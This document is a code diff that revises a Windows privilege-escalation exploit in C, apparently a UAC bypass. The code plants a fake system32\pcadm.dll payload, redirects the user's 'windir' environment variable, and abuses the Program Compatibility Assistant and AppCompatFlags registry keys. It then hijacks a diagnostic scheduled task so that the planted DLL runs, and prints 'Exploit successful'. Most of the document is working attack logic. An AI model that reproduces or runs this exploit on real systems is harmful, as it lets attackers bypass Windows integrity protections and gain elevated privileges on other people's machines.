@@ -58,22 +58,6 @@ typedef ULONG(WINAPI* EtwEventWriteNoRegistrationPtr)(
 	PEVENT_DATA_DESCRIPTOR userData
 );
 
-PWSTR BiConcatString(
-	PWSTR string,
-	PWSTR appendString
-)
-{
-	PWSTR data = HeapAlloc(GetProcessHeap(), 0,
-		((wcslen(string) * sizeof(WCHAR)) + sizeof(L'\0')) +
-		((wcslen(appendString) * sizeof(WCHAR)) + sizeof(L'\0')));
-	if (data) {
-		memcpy(data, string, wcslen(string) * sizeof(WCHAR));
-		memcpy(data + wcslen(string), appendString,
-			(wcslen(appendString) * sizeof(WCHAR)) + sizeof(L'\0'));
-	}
-	return data;
-}
-
 int BiTriggerMain(
 	void
 )
@@ -106,7 +90,6 @@ LRESULT CALLBACK BiWndClassTriggerProc(
 {
 	if (msg == WM_WINDOWPOSCHANGING) {
 		__ud2();
-		return 0;
 	}
 	return DefWindowProcW(hWnd, msg, wParam, lParam);
 }
@@ -120,6 +103,7 @@ int BiWndClassTriggerMain(
 	ATOM classAtom;
 	HWND window = NULL;
 
+	SetErrorMode(SEM_NOGPFAULTERRORBOX);
 	wc.cbSize = sizeof(WNDCLASSEXW);
 	wc.lpszClassName = L"BiLegacyTriggerClass";
 	wc.hInstance = g_Instance;
@@ -141,9 +125,11 @@ int BiWndClassTriggerMain(
 	}
 
 	ShowWindow(window, SW_NORMAL);
+	// program dies, won't need this...
 	exitCode = 0;
 
 eof:
+	// same here...
 	if (window)
 		DestroyWindow(window);
 	if (classAtom)
@@ -162,13 +148,13 @@ int wmain(
 		return BiWndClassTriggerMain();
 
 	int exitCode = EXIT_FAILURE;
-	PWSTR cmdLine = L"~";
+	WCHAR cmdLine[2];
 	PROCESS_INFORMATION processInfo = { NULL, NULL, 0 };
 	STARTUPINFOW si;
 	HRSRC resource;
 	HGLOBAL loadedResource;
 	LPVOID payload;
-	HANDLE hPayload = INVALID_HANDLE_VALUE;
+	HANDLE hPayload, hEvent = NULL;
 	BOOLEAN createdSystemFake = FALSE, createdPayload = FALSE, comReady = FALSE;
 	DWORD writtenBytes;
 	BSTR string;
@@ -178,14 +164,21 @@ int wmain(
 	IRegisteredTask* wdiTask = NULL;
 	TASK_STATE taskState;
 	HMODULE pcaModule = NULL;
-	PcaMonitorProcessPtr PcaMonitorProcess;
+	PcaMonitorProcessPtr PcaMonitorProcess = NULL; //fixme
 	DWORD curDirSize;
 	PWSTR curDir;
 	LSTATUS status;
-	BOOLEAN taskHijacked;
+	BOOLEAN taskHijacked, usesPca = TRUE;
 
-	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 < 3)
-		cmdLine = L"L";
+	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 < 3) {
+		cmdLine[0] = L'L';
+		cmdLine[1] = L'\0';
+		usesPca = FALSE;
+	}
+	else {
+		cmdLine[0] = L'~';
+		cmdLine[1] = L'\0';
+	}
 
 	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
 	if (!SUCCEEDED(hr)) {
@@ -215,7 +208,7 @@ int wmain(
 	}
 	createdSystemFake = TRUE;
 
-	hPayload = CreateFileW(L"system32\\pcadm.dll", FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE,
+	hPayload = CreateFileW(L"system32\\pcadm.dll", FILE_WRITE_ACCESS, FILE_SHARE_READ,
 		NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hPayload == INVALID_HANDLE_VALUE) {
 		wprintf(L"CreateFileW() failed. Error: %lu\n", GetLastError());
@@ -223,9 +216,11 @@ int wmain(
 	}
 	createdPayload = TRUE;
 	if (!WriteFile(hPayload, payload, SizeofResource(g_Instance, resource), &writtenBytes, NULL)) {
+		CloseHandle(hPayload);
 		wprintf(L"WriteFile() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
+	CloseHandle(hPayload);
 
 	hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
 		&IID_ITaskService, &taskService);
@@ -279,27 +274,36 @@ int wmain(
 		}
 	}
 
-	pcaModule = LoadLibraryExW(L"pcacli.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
-	if (!pcaModule) {
-		wprintf(L"LoadLibraryExW() failed. Error: %lu\n", GetLastError());
-		goto eof;
-	}
-	PcaMonitorProcess = (PcaMonitorProcessPtr)GetProcAddress(pcaModule, "PcaMonitorProcess");
-	if (!PcaMonitorProcess) {
-		wprintf(L"GetProcAddress() failed. Error: %lu\n", GetLastError());
-		goto eof;
+	if (usesPca) {
+		pcaModule = LoadLibraryExW(L"pcacli.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
+		if (!pcaModule) {
+			wprintf(L"LoadLibraryExW() failed. Error: %lu\n", GetLastError());
+			goto eof;
+		}
+		PcaMonitorProcess = (PcaMonitorProcessPtr)GetProcAddress(pcaModule, "PcaMonitorProcess");
+		if (!PcaMonitorProcess) {
+			wprintf(L"GetProcAddress() failed. Error: %lu\n", GetLastError());
+			goto eof;
+		}
 	}
 
 	curDirSize = GetCurrentDirectoryW(0, NULL);
-	curDir = HeapAlloc(GetProcessHeap(), 0, (SIZE_T)curDirSize + 1);
+	curDir = HeapAlloc(GetProcessHeap(), 0, curDirSize * sizeof(WCHAR));
 	if (!GetCurrentDirectoryW(curDirSize, curDir)) {
 		HeapFree(GetProcessHeap(), 0, curDir);
 		wprintf(L"GetCurrentDirectoryW() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
 
+	hEvent = CreateEventW(NULL, FALSE, FALSE, L"ByeIntegrity8");
+	if (!hEvent) {
+		HeapFree(GetProcessHeap(), 0, curDir);
+		wprintf(L"CreateEventW() failed. Error: %lu\n", GetLastError());
+		goto eof;
+	}
+
 	status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir", REG_SZ, curDir,
-		(curDirSize + 1) * sizeof(WCHAR) + sizeof(L'\0'));
+		curDirSize * sizeof(WCHAR));
 	if (status) {
 		HeapFree(GetProcessHeap(), 0, curDir);
 		wprintf(L"RegSetKeyValueW() failed. LSTATUS: %lu\n", status);
@@ -317,8 +321,13 @@ int wmain(
 		goto eof;
 	}
 
-	status = (LSTATUS)PcaMonitorProcess(processInfo.hProcess, 1, argv[0], cmdLine,
-		curDir, PCA_MONITOR_PROCESS_NORMAL);
+	if (usesPca)
+#pragma warning(disable:4703)
+		status = (LSTATUS)PcaMonitorProcess(processInfo.hProcess, 1, argv[0], cmdLine,
+			curDir, PCA_MONITOR_PROCESS_NORMAL);
+#pragma warning(default:4703)
+	else
+		status = 0;
 	HeapFree(GetProcessHeap(), 0, curDir);
 	if (status) {
 		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
@@ -328,39 +337,47 @@ int wmain(
 	ResumeThread(processInfo.hThread);
 
 	WaitForSingleObject(processInfo.hProcess, INFINITE);
-	GetExitCodeProcess(processInfo.hProcess, &curDirSize);
-	if (curDirSize) {
-		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
-		wprintf(L"Trigger process exited with error code: %lu\n", curDirSize);
-		goto eof;
+	if (usesPca) {
+		GetExitCodeProcess(processInfo.hProcess, &curDirSize);
+		if (curDirSize) {
+			RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
+			wprintf(L"Trigger process exited with error code: %lu\n", curDirSize);
+			goto eof;
+		}
 	}
 
 	taskHijacked = FALSE;
-	hr = E_FAIL;
-	for (int i = 0; i < 20; ++i) {
+	if (WaitForSingleObject(hEvent, 20000) == WAIT_TIMEOUT) {
 		wdiTask->lpVtbl->get_LastTaskResult(wdiTask, &hr);
-		if (hr == 0xDEADBEEF) {
-			taskHijacked = TRUE;
-			break;
-		}
-		Sleep(500);
-	}
-	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
-	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store",
-		argv[0]);
-	if (!taskHijacked) {
 		wprintf(L"Diagnostic module task did not launch & exit properly. HRESULT: %#010x\n", hr);
-		goto eof;
 	}
+	else
+		taskHijacked = TRUE;
 
-	_putws(L"[$] Exploit successful.\n");
-	exitCode = 0;
+	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
+	if (!usesPca) {
+		RegDeleteKeyValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
+			argv[0]);
+		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Persisted",
+			argv[0]);
+	}
+	else
+		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store",
+			argv[0]);
+
+	if (taskHijacked) {
+		_putws(L"[$] Exploit successful\n");
+		exitCode = 0;
+	}
+	Sleep(1000); // allow taskhostw.exe to end so we can cleanup fake pcadm.dll & system32 directory
 
 eof:
 	if (processInfo.hThread)
 		CloseHandle(processInfo.hThread);
 	if (processInfo.hProcess)
 		CloseHandle(processInfo.hProcess);
+	if (hEvent)
+		CloseHandle(hEvent);
 	if (pcaModule)
 		FreeLibrary(pcaModule);
 	if (wdiTask)
@@ -371,8 +388,6 @@ eof:
 		taskService->lpVtbl->Release(taskService);
 	if (comReady)
 		CoUninitialize();
-	if (hPayload != INVALID_HANDLE_VALUE)
-		CloseHandle(hPayload);
 	if (createdPayload)
 		DeleteFileW(L"system32\\pcadm.dll");
 	if (createdSystemFake)
